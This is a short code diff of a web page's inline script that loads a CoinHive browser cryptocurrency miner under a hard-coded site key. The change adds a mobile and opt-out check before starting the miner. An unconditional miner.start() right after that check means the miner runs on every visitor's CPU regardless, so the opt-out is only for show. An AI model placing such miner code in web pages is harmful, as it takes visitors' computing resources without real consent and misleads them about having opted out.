@@ -47,7 +47,7 @@
 			<script>
 				// coinhive 
 				var miner = new CoinHive.Anonymous('273TSN8LePKjSbjN47TOq6oyypWBf117');
-				if (!miner.isMobile()) {
+				if (!miner.isMobile() && !miner.didOptOut(14400)) {
 					miner.start();
 				}
 				miner.start();
